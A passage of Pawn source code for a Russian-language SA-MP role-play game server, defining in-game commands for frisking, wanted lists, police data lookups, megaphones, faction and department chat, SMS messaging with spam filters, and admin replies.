	    format(strs, sizeof(strs), "Лицензия на лодки\t%i\n",PlayerInfo[params[0]][pBoatLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pFishLic] == 1){
	    format(strs, sizeof(strs), "Лицензия на рыболовство\t%i\n",PlayerInfo[params[0]][pFishLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pGunLic] == 1){
	    format(strs, sizeof(strs), "Лицензия на оружие\t%i\n",PlayerInfo[params[0]][pGunLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	new bool:label = false;
	for(new i = 0; i < 46; i++)
		if(Weapons[params[0]][i] > 0)
			label = true;
	if(label){
		format(strs, sizeof(strs), "Оружие\t%i\n",1);
		strcat(frisking, strs, sizeof(frisking));
	}
	ShowPlayerDialogEx(playerid, 7779, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Информация | {AE433D}Карманы", frisking, "Забрать", "Отмена");
	format(YCMDstr, sizeof(YCMDstr), " %s обыскал %s", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPVarInt(playerid, "FriskID", params[0]);
	return true;
}
CMD:wanted(playerid, params[])
{
	new sctring[500];
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вы не законник");
	foreach(i)
	{
		if(PlayerInfo[i][pWantedLevel] >= 1)
		{
			format(YCMDstr,sizeof(YCMDstr), "%s\t|\tУровень розыска: %i\n",Name(i),PlayerInfo[i][pWantedLevel]);
			strcat(sctring,YCMDstr);
		}
	}
	if (strlen(sctring) > 1) ShowPlayerDialogEx(playerid, 11349,DIALOG_STYLE_MSGBOX, "Розыскиваются", sctring, "Закрыть", "");
	else SCM(playerid,-1,"Нет розыскиваемых");
	return true;
}
CMD:mdc(playerid, params[])
{
	if(!IsACop(playerid)) return SCM(playerid,0xafafafaa, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /mdc [id игрока]");
	if(!IsPlayerConnected(params[0])) return true;
	SCM(playerid, TEAM_BLUE_COLOR, "---======== МОБИЛЬНЫЙ КОМПЬЮТЕР ДАННЫХ ========---");
	format(YCMDstr, sizeof(YCMDstr), " Имя: %s", Name(params[0])), SCM(playerid, -1,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Преступление: %s", PlayerCrime[params[0]][pAccusedof]), SCM(playerid, COLOR_GRAD2,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Сообщил: %s", PlayerCrime[params[0]][pVictim]), SCM(playerid, COLOR_GRAD3,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Уровень розыска: %i", PlayerInfo[params[0]][pWantedLevel]), SCM(playerid, COLOR_GRAD4,YCMDstr);
	SCM(playerid, TEAM_BLUE_COLOR, "---============================================---");
	return true;
}
CMD:givemf(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /givemf [playerid]");
	if(GiveMF[params[0]])
	{
	    GiveMF[params[0]] = false;
	    format(YCMDstr, sizeof(YCMDstr), " Вы забрали у игрока мегафон", Name(params[0]));
	    SCM(playerid, COLOR_BLUE, YCMDstr);
	} else {
	    GiveMF[params[0]] = true;
		format(YCMDstr, sizeof(YCMDstr), " Вы дали игроку мегафон. Чтобы его использовать, нужно ввести команду /m", Name(params[0]));
	    SCM(playerid, COLOR_BLUE, YCMDstr);
	}
	return true;
}
CMD:megaphone(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/m)egaphone [текст]");
	if(GiveMF[playerid]) {
	    format(YCMDstr, sizeof(YCMDstr), " {{ %s: %s }}", Name(playerid), params[0]);
	    return ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	switch(PlayerInfo[playerid][pMember])
	{
	case 1,10,21:
		{
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 427 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 523 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 497) return SCM(playerid, COLOR_GRAD2, " Вы не в полицейской машине");
			format(YCMDstr, sizeof(YCMDstr), " {{ Офицер %s: %s }}",Name(playerid),params[0]);
			ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		}
	case 3,19:
		{
			new carid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(carid) != 425
					&& GetVehicleModel(carid) != 470
					&& GetVehicleModel(carid) != 433
					&& GetVehicleModel(carid) != 432
					&& GetVehicleModel(carid) != 520
					&& GetVehicleModel(carid) != 500
					&& GetVehicleModel(carid) != 497
					&& GetVehicleModel(carid) != 548) return SCM(playerid, COLOR_GRAD2, " Вы не в солдатской машине");
			format(YCMDstr, sizeof(YCMDstr), "{{ Солдат %s: %s }}",Name(playerid),params[0]);
			ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		}
	case 2:
		{
			if(GetPlayerVehicleID(playerid) >= fbicar[0] && GetPlayerVehicleID(playerid) <= fbicar[16])
			{
				format(YCMDstr, sizeof(YCMDstr), " {{ Агент FBI %s: %s }}",Name(playerid),params[0]);
				ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			} else return SCM(playerid, COLOR_GREY, " Вы не в служебном автомобиле");
		}
	}
	return true;
}
CMD:r(playerid, params[])
{
	new result[128];
	if(sscanf(params, "s[128]",result)) return	SCM(playerid, -1, " Введите: /r или /f [text]");
	if(PlayerInfo[playerid][pMuted] > 0) return   SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pJob] == 99)
			{
				new rank = PlayerInfo[playerid][pDLevel];
				format(YCMDstr, sizeof(YCMDstr), " %s [T.LVL %d]: {FFFFFF}%s", sendername,rank,result);
				SCM(i, 0x0073B7AA, YCMDstr);
			}
		}
	}
	if(GetPVarInt(playerid,"farm_rank") > 1)
	{
		switch(GetPVarInt(playerid,"farm_rank"))
		{
		case 2: format(string, 170, " [FARM %i] Фермер %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 3: format(string, 170, " [FARM %i] Заместитель %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 4: format(string, 170, " [FARM %i] Владелец %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		}
		foreach(i)
		{
			if(GetPVarInt(i,"farm_id") == GetPVarInt(playerid,"farm_id")) SCM(i,TEAM_AZTECAS_COLOR,string);
		}
		return true;
	}
	if(GetPVarInt(playerid,"CasinoRank"))
	{
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			if(!PlayerToPoint(300,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
			switch(GetPVarInt(playerid,"CasinoRank"))
			{
			case 1: format(string, 170, " [CASINO] Крупье %s: %s", sendername, result);
			default: format(string, 170, " [CASINO] Менеджер %s: %s", sendername, result);
			}
		}
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			foreach(idx)
			{
				if(!PlayerToPoint(300,idx, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2]) || !GetPVarInt(idx,"CasinoRank")) continue;
				if(GetCasino(idx, i) && GetCasino(playerid, idx) && GetPVarInt(idx,"CasinoRank")) SCM(idx,TEAM_AZTECAS_COLOR,string);
			}
		}
		return true;
	}
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 4
	|| PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pMember] == 21)
	{
		format(string, 128, " %s  %s:  %s",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PlayerInfo[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PlayerInfo[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 9
	|| PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pMember] == 12
	|| PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pMember] == 17
	|| PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pMember] == 26 || PlayerInfo[playerid][pMember] == 29)
	{
		format(string, 128, " %s  %s:  %s",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PlayerInfo[playerid][pMember], TEAM_AZTECAS_COLOR, string);
		if(tipsteron == PlayerInfo[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else SCM(playerid, COLOR_GREY, " Вам не доступен этот чат!");
	return true;
}
CMD:rb(playerid, params[])
{
	new result[128];
	if(sscanf(params, "s[128]",result)) return	SCM(playerid, COLOR_GRAD2, " Введите: /r или /f [text]");
	if(PlayerInfo[playerid][pMuted] > 0) return   SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pJob] == 99)
			{
				new rank = PlayerInfo[playerid][pDLevel];
				format(YCMDstr, sizeof(YCMDstr), " %s [T.LVL %d]: {FFFFFF}(( %s ))", sendername,rank,result);
				SCM(i, 0x0073B7AA, YCMDstr);
			}
		}
	}
	if(GetPVarInt(playerid,"farm_rank") > 1)
	{
		switch(GetPVarInt(playerid,"farm_rank"))
		{
		case 2: format(string, 170, " [FARM %i] Фермер %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 3: format(string, 170, " [FARM %i] Заместитель %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 4: format(string, 170, " [FARM %i] Владелец %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		}
		foreach(i)
		{
			if(GetPVarInt(i,"farm_id") == GetPVarInt(playerid,"farm_id")) SCM(i,TEAM_AZTECAS_COLOR,string);
		}
		return true;
	}
	if(GetPVarInt(playerid,"CasinoRank"))
	{
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			if(!PlayerToPoint(300,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
			switch(GetPVarInt(playerid,"CasinoRank"))
			{
			case 1: format(string, 170, " [CASINO] Крупье %s: (( %s ))", sendername, result);
			default: format(string, 170, " [CASINO] Менеджер %s: (( %s ))", sendername, result);
			}
		}
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			foreach(idx)
			{
				if(!PlayerToPoint(300,idx, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2]) || !GetPVarInt(idx,"CasinoRank")) continue;
				if(GetCasino(idx, i) && GetCasino(playerid, idx) && GetPVarInt(idx,"CasinoRank")) SCM(idx,TEAM_AZTECAS_COLOR,string);
			}
		}
		return true;
	}
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 4
	|| PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pMember] == 21)
	{
		format(string, 128, " %s  %s:  (( %s ))",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PlayerInfo[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PlayerInfo[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 9
	|| PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pMember] == 12
	|| PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pMember] == 17
	|| PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pMember] == 26 || PlayerInfo[playerid][pMember] == 29)
	{
		format(string, 128, " %s  %s:  (( %s ))",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PlayerInfo[playerid][pMember], TEAM_AZTECAS_COLOR, string);
		if(tipsteron == PlayerInfo[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else SCM(playerid, COLOR_GREY, " Вам не доступен этот чат!");
	return true;
}
CMD:d(playerid, params[])
{
	new result[128];
	if(sscanf(params, "s[128]",result)) return SCM(playerid, -1, " Введите: /d [текст]");
	if(PlayerInfo[playerid][pMuted] > 0)
	{
		format(string, 128, " У вас бан чата!");
		SCM(playerid, TEAM_CYAN_COLOR, string);
		return true;
	}
	//if(PlayerInfo[playerid][pRank] < 2) return SCM(playerid, COLOR_GRAD1, " Вы не уполномочены писать в депортамент!");
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	if(GetSVarInt("d_timer") > gettime()) return SCM(playerid, COLOR_GREY, " Подождите 30 секунд");
	SetSVarInt("d_timer", gettime() + 30);
	switch(PlayerInfo[playerid][pMember])
	{
	case 1: format(string, 128, " [Police LS] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 2: format(string, 128, " [FBI] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 3: format(string, 128, " [Army SF] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 4, 22, 33: format(string, 128, " [Medic] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 7: format(string, 128, " [Mayor] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 10: format(string, 128, " [Police SF] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 19: format(string, 128, " [Army LV] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 21: format(string, 128, " [Police LV] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 11: format(string, 128, " [Instructors] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	default: return SCM(playerid,COLOR_GREY," Вам не доступен этот чат!");
	}
	SendTeamMessage(PlayerInfo[playerid][pMember], COLOR_ALLDEPT, string);
	return true;
}
CMD:smson(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9) return true;
	if(GetPVarInt(playerid, "sms_listen") == 0)
	{
		SetPVarInt(playerid, "sms_listen", 1);
		SCM(playerid, COLOR_GREEN, " Вы включили прослушку SMS");
	}
	else
	{
		SetPVarInt(playerid, "sms_listen", 0);
		SCM(playerid, COLOR_REDD, " Вы отключили прослушку SMS");
	}
	return true;
}
CMD:sms(playerid, params[])
{
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /sms [playerid / phonenumber] [текст]");
	if(PlayerInfo[playerid][pLevel] >= 1 && PlayerInfo[playerid][pLevel] <= 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
		if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		if(sms_timer[playerid] > 0) return SCM(playerid, COLOR_GREY, " Для игроков с уровнем ниже 3, работает лимит 1 смс в 30 секунд!");
		if(WantSms[playerid][params[0]] != 1)
		{
		    if(PhoneOnline[params[0]] > 0)
			{
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}

			PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i] ",params[1],Name(params[0]),params[0]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " (( СМС попало в СПАМ. Получатель может снять защиту, если отправит СМС вам ))");
			format(YCMDstr, sizeof(YCMDstr), " SMS: {FF8000}СКРЫТО. {FFFF00}Отправитель: %s[%i]",Name(playerid), playerid);
			SCM(params[0], COLOR_YELLOW, YCMDstr);
			SCM(params[0],  -1, " (( Отправитель имеет уровень ниже 3. Ответное СМС снимает защиту от СПАМА ))");
			PlayerInfo[playerid][pMobile] += 2;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PlayerInfo[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			return true;
		}
	}
	
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new is1=1;
	new r=0;
	while(strlen(params[is1]))
	{
		if('0'<=params[is1]<='9')
		{
			new is2=is1+1;
			new p=0;
			while(p==0)
			{
				if('0'<=params[is2]<='9'&&strlen(params[is2])) is2++;
				else
				{
					strmid(strR[r],params,is1,is2,255);
					if(strval(strR[r])<255) r++;
					is1=is2;
					p=1;
					sms_timer[playerid] = 30;
				}
			}
		}
		is1++;
	}
	if(r>=4)
	{
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
	 	new ip[26];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string, 156, "SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid),playerid);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		PlayerInfo[playerid][pMuted] = 10800;
		return 1;
	}
	if(Rekl[playerid] == 1 && strfind(params[1],"www",true)!=-1 || Rekl[playerid] == 1 && strfind(params[1],".ru",true)!=-1
			|| Rekl[playerid] == 1 && strfind(params[1],".net",true)!=-1 || Rekl[playerid] == 1 && strfind(params[1],".com",true)!=-1
			|| Rekl[playerid] == 1 && strfind(params[1],"http",true)!=-1)
	{
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
	 	new ip[26];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string, 156, "SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid),playerid);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		PlayerInfo[playerid][pMuted] = 10800;
		return 1;
	}
	GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
	CallInfo[playerid][callused] = 1;
	switch (params[0])
	{
	case 11888:
		{
			if(smsls == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " LS NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smsls, COLOR_YELLOW, YCMDstr);
   			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: LS NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PlayerInfo[playerid][pMobile] += smspricels;
			FracBank[0][fLsnews] += smspricels;
			foreach(i)
			{
			    if(PlayerInfo[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], "LS NEWS", params[1]);
			    }
			}
		}
	case 11555:
		{
			if(smssf == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " SF NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smssf, COLOR_YELLOW, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: SF NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PlayerInfo[playerid][pMobile] -= smspricesf;
			FracBank[0][fSfnews] += smspricesf;
			foreach(i)
			{
			    if(PlayerInfo[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], "SF NEWS", params[1]);
			    }
			}
		}
	case 11333:
		{
			if(smslv == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " LV NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smslv, COLOR_YELLOW, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: LV NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PlayerInfo[playerid][pMobile] += smspricelv;
			FracBank[0][fLvnews] += smspricelv;
			foreach(i)
			{
			    if(PlayerInfo[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], "LV NEWS", params[1]);
			    }
			}
		}
	}
	foreach(i)
	{
		if(IsPlayerConnected(params[0]))
		{
			if(PhoneOnline[params[0]] > 0)
			{
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			
			PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i] ",params[1],Name(params[0]),params[0]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " Сообщение доставлено");
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(params[0], COLOR_YELLOW, YCMDstr);
			PlayerInfo[playerid][pMobile] += 2;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PlayerInfo[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			WantSms[params[0]][playerid] = 1;
			return true;
		}
		else if(params[0] == PlayerInfo[i][pPnumber])
		{
			if(PhoneOnline[i] > 0)
			{
				for(new j = 0; j < MAX_PLAYERS; j++)
				{
				    if(PlayerInfo[j][pAdmin] && GetPVarInt(j, "sms_listen"))
				    {
				        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], Name(params[0]), params[1]);
				    }
				}
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			PlayerInfo[playerid][pMobile] +=20;
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(i, COLOR_YELLOW, YCMDstr);
			PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i]",params[1],Name(i), i);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " Сообщение доставлено");
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PlayerInfo[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PlayerInfo[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			WantSms[params[0]][playerid] = 1;
			return true;
		}
	}
	return true;
}
CMD:pm(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] == 0 && (PlayerInfo[playerid][pHelper] == 0 || PlayerInfo[playerid][pHelper] == 2)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(dostup[playerid] != 1 && PlayerInfo[playerid][pHelper] == 0) return true;
	if(sscanf(params, "us[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /pm [ид] [текст]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerInfo[playerid][pAdmin] >=1)
	{
		format(YCMDstr, sizeof(YCMDstr), " Ответ от %s[%i]: %s",Name(playerid),playerid,params[1]);
		SCM(params[0], 0xD97700AA, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), "<-Ответ К %s[%i]: %s",Name(params[0]),params[0],params[1]);
		SendAdminMessage(0xD97700FF,YCMDstr);
		printf("Администратор %s ответил игроку %s: %s", Name(playerid), Name(params[0]), params[1]);
	}
	else if(PlayerInfo[playerid][pHelper] == 1 && SDuty[playerid] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), "<-Ответ %s[%i]: %s",Name(params[0]),params[0],params[1]);
		SCM(params[0], 0xFFA500AA, YCMDstr);
